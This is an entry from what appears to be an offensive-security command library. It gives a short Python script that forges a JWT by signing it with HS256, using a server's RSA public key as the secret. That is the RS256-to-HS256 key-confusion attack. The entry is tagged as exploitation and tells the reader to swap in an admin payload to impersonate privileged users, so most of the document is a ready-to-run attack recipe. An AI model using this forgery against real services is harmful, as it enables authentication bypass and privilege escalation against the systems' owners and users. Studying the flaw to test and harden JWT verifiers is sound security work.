---
type: command
executor: python
data: |-
  import jwt
  public = open('public.pem', 'r').read()
  print public
  print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - python
  - jwt
  - encoding
  - exploitation
verified: true
validated: true
---

# python-jwt-encode-hs256-with-public-key

## Command

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

## Description

Encodes a JWT payload using HS256 algorithm with an RSA public key as the secret, exploiting key confusion in vulnerable JWT verifiers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `public.pem` | File containing the RSA public key in PEM format | Yes |
| `{"data":"test"}` | Payload dictionary to encode (modify for attack) | Yes |
| `algorithm='HS256'` | Signing algorithm (fixed for this attack) | Yes |

## Examples

### Basic Usage

Save as script and run: `python jwt_encode.py`

### With Admin Payload

Modify payload to `{"sub":"admin", "role":"admin"}` before running.

## Expected Output

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoic2VjcmV0In0.signature

## Related

- [[procedures/JWT-Key-Confusion-Attack-RS256-to-HS256]]
